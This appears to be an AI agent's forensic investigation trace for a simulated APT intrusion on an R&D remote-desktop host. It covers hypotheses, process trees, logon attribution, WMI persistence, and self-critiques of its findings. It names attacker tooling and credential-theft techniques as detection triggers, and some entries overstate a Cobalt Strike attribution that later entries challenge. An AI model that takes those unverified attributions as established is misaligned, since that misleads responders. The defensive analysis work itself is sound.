entries.conclusion:
Analysis of CRIMSON OSPREY scope on rd-01 (172.16.6.11):

The observation requests a full-scope reconstruction. Let me challenge the assumption that the visible artifacts on rd-01 represent the complete picture, and rank competing hypotheses about each phase.

H1 — Initial access via inbound RDP/RDS abuse to rd-01 (LIKELIHOOD: HIGH)
rd-01 is explicitly an R&D Remote Desktop Services host. STUN.exe parented by svchost.exe (PID 1244) suggests service-spawned execution, consistent with RDP session host -> session-spawned svchost -> staged binary. tdungan interactive at capture time may be the abused account or a coincident user.
Confirm: Security 4624 Type 10/RemoteInteractive from 172.15.1.20 (or proxy), TerminalServices-RemoteConnectionManager/LocalSessionManager logs, NTUSER.DAT for tdungan, RDP bitmap cache.
Rule out: Absence of external 3389 sessions; presence of phishing-derived child processes under explorer.exe predating STUN.exe.

H2 — Initial access via phishing/payload delivery to tdungan (LIKELIHOOD: MEDIUM)
The 7 msedge.exe masquerades spawned from explorer.exe suggest user-context execution that could indicate document/browser-delivered loader. PowerRunner.A is a PowerShell-staged trojan family.
Confirm: Outlook/OWA artifacts, browser history/downloads for tdungan, prefetch for msedge masquerades, parent chain showing winword/outlook -> powershell -> dropper.
Rule out: msedge masquerades postdate STUN.exe and are second-stage only.

H3 — Initial access via exploitation of an internet-exposed service on rd-01 (LIKELIHOOD: MEDIUM)
svchost PID 1244 parenting STUN.exe could be WebClient, BITS, or a vulnerable service. External IP 172.15.1.20 is noted as attacker — direct inbound exploitation possible.
Confirm: svchost 1244 service tag (tasklist /svc equivalent via vol.cmdline/sessions), netscan showing 1244 listeners, firewall logs.

Persistence — competing mechanisms:
H4 (HIGH): Scheduled task — explicit execution chain STUN.exe -> svchost -> taskhostw confirms task-based persistence/execution. Confirm via Task Scheduler Operational log (106/200/201), \Windows\System32\Tasks\ XMLs, Software hive TaskCache.
H5 (HIGH): atmfd.dll Autoruns entry with no file = phantom DLL / AppInit or font driver hijack staged but currently unhooked, OR remnant of prior attempt. Confirm via registry key holding the reference (likely AppInit_DLLs or KnownDlls or Font Drivers key in CurrentControlSet).
H6 (MEDIUM): pssdnsvc.exe — name suggests masquerade as DNS service; could be a registered Windows service for persistence. Confirm via System hive Services key, Sysmon 4697, hash vs legitimate PsShutdown.

Lateral movement:
H7 (HIGH): net use H: to \\172.16.6.12\c$\Users at 14:52:04 by PID 9128 is hands-on-keyboard SMB admin-share mapping, likely with stolen credentials (tdungan token, or harvested rsydow-a/cbarton-a). The target Users directory suggests staging/profile theft, not pure recon.
Confirm: 4624 Type 3 on .12 from .11 at 14:52:04, source account, 4672 if privileged; check LSASS access on rd-01 (Mimikatz/comsvcs MiniDump), Security 4648 explicit credential use.
H8 (alt, LOWER): the net use was tdungan's legitimate workflow. Rule out via tdungan's baseline behavior and whether PID 9128's parent is the STUN/taskhostw chain vs explorer.

Exfiltration:
H9 (MEDIUM): STUN.exe name strongly implies STUN/TURN protocol abuse for NAT traversal C2 and exfil to 172.15.1.20 — characteristic of CRIMSON OSPREY-class APTs using legitimate-looking UDP. Confirm via netscan for UDP sessions from PID 1912, pcap for STUN binding requests to external IP.
H10 (MEDIUM): Exfil staged via the H: mount from .12 — pull data to rd-01 then egress. Confirm via MFT timeline on rd-01 for large writes post-14:52:04, USN journal.
H11 (LOW-MEDIUM): No exfil yet — incident caught mid-kill-chain (Defender repeatedly killing msedge masquerades suggests attacker still iterating).

Adversarial challenges to the leading narrative:
- tdungan being logged in at capture may be misleading — the malicious svchost->STUN chain is SYSTEM-context; tdungan may be victim of session hijack, not the entry account.
- The 7 msedge masquerades being repeatedly killed by Defender suggests the attacker LOST persistence on rd-01 and may have already migrated; rd-01 may be a noisy decoy while the real foothold is on a memory-only pivot host.
- atmfd.dll missing from disk could indicate anti-forensic self-deletion, not failed install — check USN/$LogFile for deletion events.

Top two competing hypotheses to discriminate first: H1 (RDP-borne initial access via tdungan/RDS) vs H2 (phishing to tdungan in user context). The discriminator is the parent-process lineage of the earliest STUN.exe/msedge artifacts and the logon type/source for tdungan's session.

inputs.user_message:
OBSERVATION:
What is the full scope of CRIMSON OSPREY's compromise of Stark Research Labs — initial access vector, attack timeline, lateral movement path, persistence mechanisms, and data exfiltration — beginning from primary compromise host rd-01 (172.16.6.11)?

SUPPORTING EVIDENCE:
Known IOCs: STUN.exe at C:\Windows\System32\STUN.exe (PID 1912, parent svchost.exe PID 1244); 7 msedge.exe masquerade instances from STUN.exe + explorer.exe (Trojan:Win32/PowerRunner.A); pssdnsvc.exe in C:\Windows\ (name/path mismatch for PsShutdown); atmfd.dll in Autoruns but absent from filesystem; lateral movement net use H: \\172.16.6.12\c$\Users via net.exe PID 9128 on 2023-01-25 14:52:04; execution chain STUN.exe -> svchost.exe -> taskhostw.exe (scheduled task); Windows Defender detected/terminated msedge repeatedly. Primary user tdungan logged in at memory capture. External attacker IP 172.15.1.20; lateral target 172.16.6.12.

CASE CONTEXT:
Domain SHIELDBASE (Win Server 2022, Win11 endpoints). Threat actor CRIMSON OSPREY (state APT). Incident declared 2023-01-24. rd-01 = R&D RDS 172.16.6.11. Domain admins rsydow-a, cbarton-a; break-glass srl.admin; local admin srladmin. McAfee ePO 172.16.5.20. F-Response subject_srv.exe TCP/3262 is IR examiner traffic, not attacker. 8 hosts with evidence; many memory-only pivot hosts.

entries.content: Pre-plan reads done. Key signals: **OneDrive for Business sync root** bound to SID `...-1116` in SOFTWARE (candidate exfil channel), **RDP-Tcp WinStation** configured, LanmanServer shares, AppCompatCache present; SAM user-accounts plugin errored (Win11 SAM quirk — I'll pull users via vol.hashdump/regripper later). Now the grounded plan.

entries.conclusion:
Reviewing case: APT intrusion, both memory and disk available, primary host rd-01. Need IAV, timeline, lateral, persistence, exfil. Multiple user profiles including domain admins. Known IOCs give us a strong process-tree anchor (STUN.exe PID 1912, parent svchost 1244, child chain to taskhostw).

THREAT SCENARIOS (ranked):
1. RDS-borne initial access — rd-01 is an RDS host with RDP-Tcp configured. External 172.15.1.20 likely landed via exposed RDP/RDS published app, credential-stuffed a low-priv user (tdungan logged in at capture), then dropped STUN.exe via svchost child (1244->1912 implies service-spawned or scheduled-task-spawned launcher — consistent with a service masquerade pssdnsvc.exe creating STUN.exe).
2. Service-masquerade persistence chain — pssdnsvc.exe service in C:\Windows\ is the persistence anchor; atmfd.dll Autoruns entry with no disk file = AppInit/AppCertDlls/Font driver ghost entry (or KnownDlls hijack remnant) — likely a secondary persistence or a wiped loader.
3. Lateral movement to 172.16.6.12 via mapped admin share H:\ using cbarton-a or rsydow-a domain admin creds — credential theft on rd-01 (LSASS dump or Mimikatz-in-memory) preceded the 14:52:04 net use.
4. Exfil via OneDrive for Business SyncRootManager bound to tdungan's SID — staging in user profile OneDrive folder, sync to attacker-controlled tenant. Classic living-off-the-cloud exfil.
5. Scheduled task as the persistence trigger (taskhostw in chain) — Task Scheduler EID 106/200/201 will name the task.

HIGHEST-YIELD ARTIFACTS:
- Memory first: STUN.exe (1912), svchost (1244), and any msedge.exe masquerades are still resident — cmdlines, handles, injected sections, network sockets. This is the richest single source.
- Security.evtx (4624 type 10 RDP logons from 172.15.1.20 candidates), System.evtx (7045 service install for pssdnsvc), Microsoft-Windows-TaskScheduler/Operational (106/140/200), Microsoft-Windows-TerminalServices-LocalSessionManager/Operational (21/22/25), Sysmon if present.
- $MFT timeline anchored on STUN.exe creation, pssdnsvc.exe creation, atmfd.dll original location.
- Amcache + AppCompatCache + Prefetch for execution evidence of all msedge masquerades, STUN.exe, net.exe, taskhostw children.
- All NTUSER.DAT hives (tdungan, rsydow-a, cbarton-a, administrator.shieldbase, spsql, Administrator) + UsrClass.dat — UserAssist, RecentDocs, RunMRU, TypedPaths, ShellBags will distinguish attacker-driven sessions from legit users and identify which admin account was abused for lateral move.
- OneDrive logs under tdungan profile (SyncDiagnostics, business1 logs) for exfil file list.

TTPs TO HUNT (MITRE):
- T1021.001 RDP initial access; T1078 valid accounts
- T1543.003 Windows Service (pssdnsvc); T1036.005 masquerading (msedge.exe, STUN as System32 binary)
- T1053.005 Scheduled Task (taskhostw branch); T1547.001 / T1546 Autoruns (atmfd.dll ghost)
- T1003.001 LSASS; T1550/T1021.002 SMB admin shares (net use H:)
- T1567.002 exfil to cloud (OneDrive); T1071.1 C2 to 172.15.1.20
- T1070.004 file deletion (atmfd.dll absent), T1070.001 log clear — check

TOOL SEQUENCE (memory → disk → registry → logs → network → correlation):
1. vol.pstree to lock the STUN/svchost/taskhostw/msedge chain and identify any additional children/siblings.
2. vol.cmdline across all suspect PIDs (1912, 1244, msedge instances, net.exe 9128, taskhostw) for args, parent confirmation, scheduled task names.
3. vol.netscan to map STUN/msedge sockets to 172.15.1.20 and any internal pivots.
4. ez.evtxecmd over /mnt/rd01 Windows\System32\winevt\Logs for Security, System, TerminalServices-*, TaskScheduler/Operational, RemoteConnectionManager, Sysmon/Operational, PowerShell/Operational, OAlerts.
5. ez.recmd_batch across SOFTWARE, SYSTEM, SAM, and every NTUSER.DAT (tdungan, rsydow-a, cbarton-a, administrator.shieldbase, spsql, Administrator) + UsrClass.dat — UserAssist, RunMRU, TypedPaths, ShellBags, Services, Run keys, AppInit, Image File Execution Options. Cross-reference which SIDs executed attacker tooling.

RED FLAGS THAT REORDER:
- If vol.netscan shows live C2 to 172.15.1.20 from STUN — pivot to net.tcpdump_* if pcap surfaces, dump STUN process memory immediately for keys/config.
- If Security.evtx shows 1102 (log cleared) — jump to af.af_event_log_clear, USN journal gaps via af.af_usn_gaps before more parsing.
- If vol.cmdline shows mimikatz/comsvcs.dll lsass dump — escalate credential-theft branch and treat rsydow-a/cbarton-a as compromised, broaden to 172.16.6.12 image request.
- If atmfd.dll persistence is actually a font driver hijack with a hidden ADS or shadow copy — switch to tsk.fls/icat with ADS enumeration before continuing.
- If OneDrive SyncRootManager shows a non-Stark tenant ID — exfil branch becomes priority 1.
- If tdungan UserAssist shows zero attacker tool execution but rsydow-a does — reprioritize that NTUSER.DAT chain.

Cross-reference step (mandatory): every execution/logon artifact will be mapped against the user roster {tdungan, rsydow-a, cbarton-a, administrator.shieldbase, spsql, Administrator, SYSTEM, NETWORK SERVICE} to attribute each attacker action to a SID.

- **netscan**: RDP listener on 3389 confirmed (svchost PID 652); an **ESTABLISHED connection rd-01 172.16.6.11:49788 → 172.16.4.10:8080** (the Squid proxy in the Services net — candidate C2/exfil egress path); McAfee present.
- **malfind**: RWX injected regions in **powershell.exe (PID 8712)** and **p.exe (PID 8260)** — both strong injection candidates (PowerRunner.A is PowerShell-staged). Outlook/UpdaterUI hits look like benign Office/McAfee FPs.
- pstree/cmdline truncated in display (full output is preserved in the trace). Memory capture timestamps are 2018-08-30 (dataset baseline).

More importantly, this is a genuine **self-correction point**: the case-file IOC PIDs don't exist in this image, but a real implant (`c:\windows\temp\perfmon\p.exe`) does. This memory capture is dated 2018-08-30 (boot CreateTime), so the 2023 case-file PIDs belong to a different report/capture. The actual present implant in THIS image is p.exe at c:\windows\temp\perfmon\p.exe (PID 8260) with RWX/PAGE_EXECUTE_READWRITE injected VAD (malfind), plus powershell.exe (PID 8712) with RWX injected regions and null cmdline. Verification must proceed against artifacts actually resident in this image, not the case-file PID list. Re-hypothesis required on the perfmon\p.exe execution chain.

entries.content:
Full unified attack tree on rd-01, all in Session 0:

```
svchost DcomLaunch (868)
  └─ WmiPrvSE.exe (2876)                    ← WMI remote execution trigger
       └─ powershell.exe (8712) 16:43:36     [RWX-injected]  PowerRunner.A
            └─ powershell.exe (5848) 16:43:42 (Wow64/32-bit)
                 └─ cmd.exe (5948) 22:15:18
                      └─ p.exe (8260) 22:15:18  c:\windows\temp\perfmon\p.exe  [RWX-injected]
```

This is a coherent **WMI → PowerShell stager → implant** chain (T1047 / T1059.001 / T1055). The WMI root means rd-01 was driven by a remote (or local) WMI call — event logs will give the source. Let me re-hypothesize on the WMI trigger (new vector/principal) and evaluate the implant-chain finding.

entries.conclusion:
ANALYSIS

The WmiPrvSE→powershell chain in Session 0 with RWX-injected memory and null command line is a textbook T1047 remote WMI execution (Impacket wmiexec / wmic /node / Invoke-WmiMethod). The null cmdline + RWX VADs strongly suggests in-memory payload staging (likely Cobalt Strike / PowerShell Empire stager). Question is who/where, not what.

COMPETING HYPOTHESES

H1 — Remote WMI execution from 172.16.6.14 by a compromised admin account (HIGH)
Inbound SMB from .14:65368→445 ESTABLISHED is the smoking gun: lateral movement tooling like wmiexec uses SMB (ADMIN$ for output retrieval) alongside DCOM/RPC (135 + ephemeral) for the IWbemServices ExecMethod call. Session 0 + WmiPrvSE parent + null cmdline matches Impacket wmiexec semantics exactly (it invokes Win32_Process.Create with a cmd line that PowerShell may receive via stdin redirection, leaving the child cmdline empty in some captures).
Confirm: Security 4624 Type 3 at/just before 16:43:36 from SourceNetworkAddress 172.16.6.14 with LogonProcessName=NtLmSsp or Kerberos; matching 4672 if privileged; Microsoft-Windows-WMI-Activity/Operational EID 5857/5858/5860/5861 showing IWbemServices ExecMethod Win32_Process::Create with ClientMachine=rd-?? and User=<acct>; Sysmon EID 3 inbound 135/445 from .14; Sysmon EID 1 for PID 8712 with ParentImage WmiPrvSE and User=<acct>.
Rule out: no inbound 135/RPC from .14, no 4624 Type 3 correlated in time.

H2 — Local WMI abuse by an already-resident implant on rd-01 (MEDIUM)
The actor may already own rd-01; the inbound SMB from .14 could be unrelated (file share, another session). A local process (e.g., scheduled task, service, prior beacon) could invoke WMI locally to spawn powershell via WmiPrvSE to break parent-child detection from a flagged parent. WMI-Activity would show ClientMachine=rd-01 and ClientProcessId pointing to the real initiator.
Confirm: WMI-Activity 5857/5861 with ClientMachine=localhost/rd-01 and a ClientProcessId resolvable to a local PID; no 4624 Type 3 near 16:43:36; Sysmon EID 1 ParentProcessId chain to a local persistence host.
Rule out: WMI-Activity shows remote ClientMachine; 4624 Type 3 aligns.

H3 — Legitimate admin/management tooling (SCCM, PDQ, Ansible-WinRM-equiv, vuln scan) (LOW)
WmiPrvSE→powershell does occur in management tooling. But RWX VADs, null cmdline, off-hours cmd.exe→c:\windows\temp\perfmon\p.exe at 22:15, and CRIMSON OSPREY context make this implausible. Still must be excluded by identifying the calling account.
Confirm: 4624 Type 3 from a known mgmt host with service account (spsql/srladmin?) on a documented schedule; signed script content; no injection.
Rule out: source is .14 (a user workstation, not mgmt), or account is a user/admin interactive account.

H4 — DCOM lateral via MMC20/ShellWindows misattributed as WMI (LOW)
DCOM lateral movement via MMC20.Application also surfaces under DcomLaunch; but the child being WmiPrvSE specifically points to WMI provider, not generic DCOM. Largely excluded by parent image, kept for completeness.

DISCRIMINATORS BETWEEN H1 AND H2
The decisive artifacts are:
- Microsoft-Windows-WMI-Activity/Operational EIDs 5857/5860/5861 → ClientMachine + User + ClientProcessId
- Security 4624 Type 3 at 16:43:30–16:43:36, SourceNetworkAddress, TargetUserName, LogonProcessName, AuthenticationPackageName
- Sysmon EID 3 inbound to rd-01 on 135/445/49152-65535 from .14 at that timestamp
- Sysmon EID 1 for PID 8712: User SID, IntegrityLevel, ParentImage/ParentCommandLine
- 4648 (explicit creds) on the source if .14 is also imaged

If 4624 Type 3 from .14 ↔ WMI-Activity ClientMachine=<.14 hostname> ↔ Sysmon inbound 135 from .14 all align on the same account → H1 confirmed and account attributed (likely a privileged one: administrator.shieldbase, srladmin, srl.admin, or compromised cbarton-a/rsydow-a admin variant).

inputs.user_message:
OBSERVATION:
WmiPrvSE.exe (PID 2876, parent svchost DcomLaunch 868) spawned powershell.exe (PID 8712) at 2018-08-30 16:43:36 in Session 0, which has RWX-injected memory and a null command line — who triggered this WMI process-create and from where?

SUPPORTING EVIDENCE:
vol.pslist: WmiPrvSE.exe PID 2876 PPID 868 (svchost DcomLaunch) SessionId 0; child powershell.exe PID 8712 created 16:43:36 SessionId 0, malfind shows PAGE_EXECUTE_READWRITE VadS regions in 8712; 8712 spawned a second powershell.exe PID 5848 (Wow64) at 16:43:42; 5848 later spawned cmd.exe 5948 at 22:15:18 which spawned p.exe (c:\windows\temp\perfmon\p.exe, PID 8260, also RWX-injected). netstat shows rd-01 172.16.6.11 inbound SMB from 172.16.6.14:65368->445 ESTABLISHED and outbound SMB to 172.16.4.5:445; heavy egress to Squid proxy 172.16.4.10:8080.

CASE CONTEXT:
rd-01 (172.16.6.11) R&D RDS, domain SHIELDBASE, CRIMSON OSPREY APT. WMI remote process-create (WmiPrvSE->powershell) is a classic lateral-movement / remote-exec vector (T1047). Need to determine whether the WMI call originated remotely (which host/account) or locally, via Security 4624 type 3 logons, Microsoft-Windows-WMI-Activity/Operational, and Sysmon. Candidate source 172.16.6.14 (inbound SMB). Roster: tdungan, rsydow-a, cbarton-a, administrator.shieldbase, spsql, srladmin, srl.admin.

entries.conclusion:
EVIDENCE SUPPORT
- Process tree (WmiPrvSE 2876 -> ps 8712 -> ps 5848 -> cmd 5948 -> p.exe 8260): supported by vol.pslist PPID chain across calls 58/62/65/59/63.
- p.exe image path c:\windows\temp\perfmon\p.exe: supported by vol.cmdline PID 8260 (call 47).
- PAGE_EXECUTE_READWRITE VadS in PID 8260 and PID 8712: supported by vol.malfind (call 44).
- WmiPrvSE parented to svchost DcomLaunch (PID 868): supported by call 63, consistent with normal WMI provider hosting.

CONTRADICTING / WEAKENING EVIDENCE
- vol.malfind PAGE_EXECUTE_READWRITE + VadS is a heuristic — many legitimate processes (especially PowerShell with .NET JIT, CLR, AMSI) routinely produce malfind hits. Without a YARA hit, shellcode disassembly, or hex preview from the malfind output, "injected" is overclaimed for PID 8712.
- Creation timestamp "2018-08-30 16:43:36" for PID 8712 is asserted but no vol.pslist CreateTime field is cited in the supporting evidence excerpt.
- No evidence shown that WmiPrvSE actually spawned 8712 via a WMI event consumer or Win32_Process.Create — PPID linkage alone does not prove WMI was the execution vector (it only proves the provider hosted the call). Could be a benign administrative WMI call.
- No hash, strings, or YARA result on p.exe is cited. The path c:\windows\temp\perfmon\ is suspicious but not proof of malice.
- Session 0 across all is consistent with WMI but also consistent with a service/scheduled task chain.

ALTERNATIVE EXPLANATIONS
- Legitimate admin/SCCM/monitoring tooling invoking PowerShell via WMI (common in enterprises) producing the same parentage and malfind signatures.
- PowerShell JIT/CLR allocations producing false-positive malfind on 8712; p.exe could be the only truly malicious artifact.
- A red team / EDR agent staging from temp\perfmon.

HALLUCINATION CHECK
- "PAGE_EXECUTE_READWRITE injected" — the word "injected" is an interpretation; malfind reports RWX VAD presence, not injection mechanism. Flag.
- Created timestamp 2018-08-30 16:43:36 for PID 8712 — not present in the cited call outputs; possible invented specificity. Flag.
- "WMI-based execution" as confirmed technique — PPID to WmiPrvSE supports it but is not exclusive proof. Moderate confidence, not confirmed.
- T1047/T1059.001/T1055 IDs are real and appropriately scoped.

FACT-CHECK
- ATT&CK IDs valid and correctly described.
- VadS + RWX is the canonical malfind pattern; technically accurate but not pathognomonic.
- No negative claims of significance here; the prior STUN refutation is noted as self-correction and is appropriate.

ADDITIONAL INVESTIGATION TO UPGRADE
- vol.dumpfiles or vol.vadinfo/vaddump on PID 8260 and 8712 RWX regions, then yara.scan_file / strings.floss_extract on dumps.
- hash.hash_file on p.exe (dumped via vol.dumpfiles) + enrich.vt_lookup_hash.
- vol.pslist with CreateTime column captured to confirm 8712 timestamp.
- Microsoft-Windows-WMI-Activity/Operational evtx via ez.evtxecmd to confirm WMI consumer / Win32_Process.Create call.
- correlate.process_to_file to tie p.exe on disk.

VERDICT: UNCERTAIN — process chain and p.exe path are well-supported; "injection" and "WMI execution vector" are reasonable leads but not yet proven without dump+YARA and WMI-Activity log corroboration.

next_hypothesis_triggers: YARA hit on dumped RWX region of 8712 confirms injection vs CLR FP
WMI-Activity evtx shows Win32_Process.Create from remote host confirms T1047 vector
p.exe hash reputation confirms implant identity and possible CRIMSON OSPREY attribution

entries.content:
**Attribution breakthrough.** Logons on 2018-08-30 reveal two distinct principals hitting rd-01 around the implant spawn:

| Time (UTC) | Account | Type | Source | Auth |
|---|---|---|---|---|
| 16:37 / 16:41 / 16:44 | `shieldbase\nromanoff` | 3 | **172.16.6.14 (BASE-RD-04)** | NTLM |
| 16:42:44 & **16:43:36** | `SHIELDBASE\spsql` | 3 | **172.16.4.5** | Kerberos |
| 19:49:29 | `shieldbase\tdungan` | 2 | 127.0.0.1 (console) | Negotiate |

The **16:43:36 spsql Kerberos type-3 from 172.16.4.5** aligns *exactly* with the WmiPrvSE→PowerShell CS-beacon spawn — that's the WMI lateral-movement vector into rd-01. Separately, **nromanoff from BASE-RD-04 (172.16.6.14)** via NTLM is a second principal (matches the inbound SMB). Both are distinct principals to track. Re-evaluating the strengthened findings before recording.

entries.conclusion:
Analysis

1. EVIDENCE SUPPORT
- YARA match on p.exe for CobaltStrike_ReflectiveDLL: directly supported by yara.scan_file call 80.
- PE32+ x86-64: supported by strings.file_identify call 79.
- SHA256/size: supported by hash.hash_file call 78.
- RWX region in PID 8260: supported by vol.malfind call 44.
- Image path: supported by vol.cmdline call 47.
- Parent chain cmd→ps→ps→WmiPrvSE: claimed from vol.pslist but no excerpt shown; the WmiPrvSE as child of powershell is odd (WmiPrvSE is normally a child of svchost/DcomLaunch). Likely mis-stated direction.

2. CONTRADICTING EVIDENCE
- WmiPrvSE.exe (PID 2876) being a child of a powershell.exe is atypical; if anything, WmiPrvSE typically spawns powershell, not the reverse. This suggests the parentage chain as written may be inverted or misread.
- No C2 traffic, no beacon config extraction, no sleep/jitter pattern, no named pipe artifacts cited — all standard CS corroboration is absent.

3. ALTERNATIVE EXPLANATIONS
- YARA rule "CobaltStrike_ReflectiveDLL" may match on generic reflective loader stubs (Metasploit, Sliver, Havoc, Brute Ratel, open-source RDI implementations all share reflective loader code patterns derived from Stephen Fewer's RDI). Calling this "Cobalt Strike" specifically requires beacon config decode.
- RWX region alone is consistent with many loaders, packers, JIT, and legitimate software.
- PowerShell→PowerShell→p.exe chain is suspicious but does not prove reflective DLL loading was the staging mechanism — that is inferred, not observed.

4. HALLUCINATION CHECK
- "Cobalt Strike beacon" — overclaim from a single YARA rule name. No beacon config, no sleep_mask, no malleable C2 profile extraction shown.
- "reflective-DLL loading" — the rule name implies it; no PE parse, no export of ReflectiveLoader, no MZ-in-RWX dump cited.
- "staged via a PowerShell chain (T1059.001)" — parent process tree shown, but no PowerShell command line, no script block log, no encoded command captured. Staging is inferred.
- CRIMSON OSPREY APT attribution: not supported by any cited evidence in this finding.
- T1055 is correct as a technique ID (Process Injection); T1059.001 (PowerShell) is correct. But applying T1055 requires evidence of injection into another process — RWX in p.exe's own address space is allocation, not necessarily injection into a target.

5. FACT-CHECK
- YARA-alone-equals-tool-identification: VIOLATED. Finding upgrades YARA lead to "is a Cobalt Strike beacon" as fact.
- VadS tag: VadS is a valid Windows VAD short tag for private memory; consistent with malfind output. OK.
- T1055 application is loose — no second process target is named for injection.
- WmiPrvSE parentage claim looks wrong directionally; needs raw pstree excerpt.

6. ADDITIONAL INVESTIGATION
- vol.malfind with dump (-D) to extract the RWX region, then strings/yara on the dump to find beacon config markers (e.g., "%%bbbb", beacon config struct, x86/x64 stub).
- yara.scan_memory_image with CS beacon config / sleep_mask / malleable_c2 rules to corroborate.
- net.tcpdump_list_connections / vol.netscan for PID 8260 to identify C2.
- vol.cmdline / misc.evtx_filter for PowerShell ScriptBlock (EID 4104) on rd-01 to substantiate the PowerShell staging chain.
- vol.pstree raw output to verify the parent/child direction with WmiPrvSE.
- enrich.vt_lookup_hash on the SHA256.

7. VERDICT: CHALLENGED
Single YARA rule match is being upgraded to a confirmed Cobalt Strike beacon attribution with no config extraction, no C2, and an internally inconsistent parent chain. Reflective loader family is plausible; "Cobalt Strike beacon" specifically is overclaimed.

next_hypothesis_triggers: beacon config struct extracted from RWX dump confirms CS family
C2 IP/domain observed from PID 8260 connections
EID 4104 ScriptBlock shows encoded loader command
VT hash hits known CS sample
pstree verifies actual parent of WmiPrvSE

entries.evidence:
Analysis

1. EVIDENCE SUPPORT
- YARA match on p.exe for CobaltStrike_ReflectiveDLL: directly supported by yara.scan_file call 80.
- PE32+ x86-64: supported by strings.file_identify call 79.
- SHA256/size: supported by hash.hash_file call 78.

entries.conclusion:
EVIDENCE SUPPORT
- 4624 LogonType=3, spsql, IP 172.16.4.5, Kerberos at 16:43:36 — directly cited from ez.evtxecmd call 85. Solid.
- WmiPrvSE.exe PID 2876, PPID 868 (DcomLaunch) spawning powershell.exe PID 8712 at 16:43:36 — vol.pslist calls 59/63. The DcomLaunch parent and WmiPrvSE→powershell chain is the canonical WMI remote-exec signature. Solid.
- Outbound SMB 172.16.6.11→172.16.4.5:445 ESTABLISHED — vol.netstat call 56. Corroborates an active session with the source host but is SMB, not WMI/DCOM (135 + ephemeral). Tangential.
- WMI-Activity/Operational log present — call 82, but no specific Event ID 5857/5858/5860/5861 cited tying the WMI activity to spsql or to the powershell spawn.

CONTRADICTING / WEAKENING EVIDENCE
- The netstat shows SMB:445, not DCOM:135 or a high-port DCOM channel. WMI uses 135 + dynamic RPC. SMB alone doesn't prove WMI; it could indicate parallel SMB activity (admin share, PsExec, file copy).
- No WMI-Activity event ID cited showing the actual ExecMethod / __EventFilter / Win32_Process Create call originating from 172.16.4.5 or spsql's logon ID.
- LogonID linkage missing: the 4624 TargetLogonId is not shown to match the token of WmiPrvSE's child powershell.exe. Same-second correlation is suggestive but not proof.
- "Cobalt Strike beacon" and "injected powershell.exe" are asserted but no malfind/yara/beacon-config evidence is cited in this finding's supporting evidence block.

ALTERNATIVE EXPLANATIONS
- Scheduled task or DCOM-based remote execution (MMC20, ShellWindows) other than WMI could produce a WmiPrvSE child if a WMI query coincidentally ran; less likely but possible.
- Legitimate management tooling (SCCM, monitoring agents, SQL admin scripts) using WMI under spsql for routine queries; the powershell child could be benign maintenance unless injection is independently proven.
- The 16:43:36 4624 and the 16:43:36 process create could be two independent events in the same second (clock granularity).

HALLUCINATION CHECK
- "Cobalt Strike beacon" — not supported by the evidence in this finding's block. No yara hit, no malfind, no beacon config referenced here.
- "injected powershell.exe" — injection not demonstrated in cited evidence (no vol.malfind, no VAD/RWX call).
- "exact second" correlation is real but framed as causal; second-level granularity is not proof.
- T1047 WMI — valid technique ID and behaviour match (WmiPrvSE→powershell from remote). Reasonable lead.
- T1078 Valid Accounts — valid ID; spsql is a service account, fits.

FACT-CHECK
- Event ID 4624 LogonType 3 with Kerberos package from a remote IP is correct.
- WmiPrvSE.exe parented by DcomLaunch (svchost) PID is the normal hosting model — correct.
- WMI remote exec normally uses TCP/135 + dynamic high ports, not 445. The SMB:445 observation is weak corroboration for WMI specifically.
- Negative-finding scrutiny: not a negative finding.

ADDITIONAL INVESTIGATION TO UPGRADE
- Pull Microsoft-Windows-WMI-Activity/Operational events 5857/5858/5860/5861 around 16:43:36 with ClientMachine / User fields.
- Extract powershell.exe PID 8712 token / LogonId via vol and match to 4624 TargetLogonId.
- vol.malfind / yara scan on PID 8712 to substantiate the "Cobalt Strike beacon / injected" claim.
- vol.cmdline for PID 8712 to see the powershell invocation.
- Check netstat for TCP/135 and ephemeral RPC connections from 172.16.4.5 around the same window.

VERDICT: CHALLENGED — the lateral-movement-via-WMI hypothesis is well supported as a strong lead (4624+Kerberos+WmiPrvSE→powershell same second), but the finding overstates: "Cobalt Strike beacon" and "injected" are not in the cited evidence, and SMB:445 is not WMI's transport. Downgrade language until WMI-Activity event and injection/beacon evidence are tied in.

next_hypothesis_triggers: WMI-Activity 5857/5860/5861 ClientMachine=172.16.4.5 ties spsql to Win32_Process Create
vol.malfind on PID 8712 yields RWX injected region or beacon config -> upgrades to Cobalt Strike
TargetLogonId of 4624 matches token LogonId of PID 8712
TCP/135 + ephemeral RPC from 172.16.4.5 observed in netscan

entries.content: Textbook **WMI event-subscription persistence (T1546.003)**: EventFilter `"PerformanceMonitor"` (query on `Win32_PerfFormattedData_PerfOS_System` SystemUptime — fires shortly after boot) bound to **CommandLineEventConsumer `"SystemPerformanceMonitor"`**, registered 2018-08-30 18:31:10 and re-registered 2018-09-06 — the consumer name and the `Temp\Perfmon\p.exe` path share the same "performance monitor" masquerade. CreatorSID RID = **1193** (a domain user, not the benign S-1-5-32-544 default). VT now confirms p.exe malicious (60/76). Re-evaluating the two tightened findings (now backed by VT + WMI persistence) before recording.

entries.conclusion:
EVIDENCE SUPPORT
- VT 60/76 malicious: enrich.vt_lookup_hash call 98 directly supports maliciousness verdict. Strong.
- PE32+ x86-64 stripped: strings.file_identify call 79. Supports it's a native Windows binary.
- YARA CobaltStrike_ReflectiveDLL match: yara.scan_file call 80. Supports family lead only, not confirmation.
- PAGE_EXECUTE_READWRITE VadS in PID 8260: vol.malfind call 44. Supports RWX private memory observation; consistent with reflective loader but not exclusive.
- Path c:\windows\temp\perfmon\p.exe: vol.cmdline call 47. Supports masquerade-path claim (Temp\Perfmon is not a legitimate Windows performance monitoring location).

CONTRADICTING EVIDENCE
- None presented that contradicts maliciousness. However, no beacon config extraction, no C2 traffic correlation, no sleep-mask or named-pipe artifacts cited to corroborate Cobalt Strike specifically.

ALTERNATIVE EXPLANATIONS
- YARA "CobaltStrike_ReflectiveDLL" rules frequently false-positive on Metasploit Meterpreter, Sliver, Brute Ratel, Havoc, and generic reflective loaders sharing the Stephen Fewer reflective DLL stub. Family attribution to Cobalt Strike from a single YARA rule is weak.
- RWX private memory is common to many packers and legitimate JITs (though unusual in C:\Windows\Temp).
- Masquerade path could theoretically be a sloppy admin tool, but VT 60/76 effectively rules that out.

HALLUCINATION CHECK
- "Reflective-loader beacon implant" — "beacon" implies CS/Meterpreter beaconing behavior. No network evidence cited (no vol.netscan, no pcap correlation). The word "beacon" overreaches what's shown; "reflective loader" is fine.
- Finding correctly hedges CS family as LIKELY. Good.
